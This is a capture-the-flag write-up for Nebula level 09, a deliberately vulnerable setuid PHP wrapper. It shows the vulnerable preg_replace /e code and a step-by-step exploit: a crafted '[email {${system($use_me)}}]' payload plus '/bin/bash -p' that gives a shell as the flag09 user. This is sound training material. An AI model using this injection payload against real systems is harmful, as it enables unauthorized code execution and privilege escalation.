# Level 09

There’s a C setuid wrapper for some vulnerable PHP code.

To do this level, log in as the **level09** account with the password **level09**. Files for this level can be found in /home/flag09.

## Source Code

```php
<?php

function spam($email)
{
  $email = preg_replace("/\./", " dot ", $email);
  $email = preg_replace("/@/", " AT ", $email);
  
  return $email;
}

function markup($filename, $use_me)
{
  $contents = file_get_contents($filename);

  $contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);
  $contents = preg_replace("/\[/", "<", $contents);
  $contents = preg_replace("/\]/", ">", $contents);

  return $contents;
}

$output = markup($argv[1], $argv[2]);

print $output;

?>
```

## Writeup

In the home directory of **flag09** there are two file, the binary **flag09** that is the SUID wrapper of php code and the php code.

```bash
level09@nebula:/home/flag09$ ll
total 13
drwxr-x--- 2 flag09 level09   98 2011-11-20 21:22 ./
drwxr-xr-x 1 root   root      60 2012-08-27 07:18 ../
-rw-r--r-- 1 flag09 flag09   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag09 flag09  3353 2011-05-18 02:54 .bashrc
-rwsr-x--- 1 flag09 level09 7240 2011-11-20 21:22 flag09*
-rw-r--r-- 1 root   root     491 2011-11-20 21:22 flag09.php
-rw-r--r-- 1 flag09 flag09   675 2011-05-18 02:54 .profile
```

If we run the code we see that the program need almost one parameter to work:

```bash
level09@nebula:/home/flag09$ /home/flag09/flag09 
PHP Notice:  Undefined offset: 1 in /home/flag09/flag09.php on line 22
PHP Notice:  Undefined offset: 2 in /home/flag09/flag09.php on line 22
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/flag09/flag09.php on line 13
```

Create a text file in **/tmp** directory and try to pass it to the program:

```bash
echo "test test test" > /tmp/test
```

Now try to launch the program:

```bash
/home/flag09/flag09 /tmp/test
```

This is the output:

```bash
level09@nebula:/home/flag09$ /home/flag09/flag09 /tmp/test 
PHP Notice:  Undefined offset: 2 in /home/flag09/flag09.php on line 22
test test test
```

If we check inside the code, we can see that the program call the **preg_replace** with a regex and the **e** parameter.

This parameter allow preg_replate to execute code inside the string.

The program use this parameter to call the **spam()** function with **\2** parameter, that replece it with the remaining text.

Try to put inside out text file a string that satisfie the regex:

```bash
echo "[email test@test.test]" > /tmp/test
```

Execute again the program:

```bash
level09@nebula:/home/flag09$ /home/flag09/flag09 /tmp/test 
PHP Notice:  Undefined offset: 2 in /home/flag09/flag09.php on line 22
test AT test dot test
```

The replacement is correct. Try now to put inside the text file some php code that can be evaluate:

```bash
echo "[email {\${system(id)}}]" > /tmp/test
```

This will show:

```bash
level09@nebula:/home/flag09$ ./flag09 /tmp/test 
PHP Notice:  Undefined offset: 2 in /home/flag09/flag09.php on line 22
PHP Notice:  Use of undefined constant id - assumed 'id' in /home/flag09/flag09.php(15) : regexp code on line 1
uid=1010(level09) gid=1010(level09) euid=990(flag09) groups=990(flag09),1010(level09)
PHP Notice:  Undefined variable: uid=1010(level09) gid=1010(level09) euid=990(flag09) groups=990(flag09),1010(level09) in /home/flag09/flag09.php(15) : regexp code on line 1

```

So we can use the second argument of the program to pass the **/bin/bash -p** command.

The second argument is stored in the **$use_me** variable:

```bash
echo "[email {\${system(\$use_me)}}]" > /tmp/test
```

Just launch:

```bash
/home/flag09/flag09 /tmp/test "/bin/bash -p"
```

This will give us a bash shell with **flag09** **euid**:

```bash
level09@nebula:/home/flag09$ ./flag09 /tmp/test "/bin/bash -p"
bash-4.2$ id
uid=1010(level09) gid=1010(level09) euid=990(flag09) groups=990(flag09),1010(level09)
```

We can finally run **getflag** command:

```bash
bash-4.2$ getflag
You have successfully executed getflag on a target account
```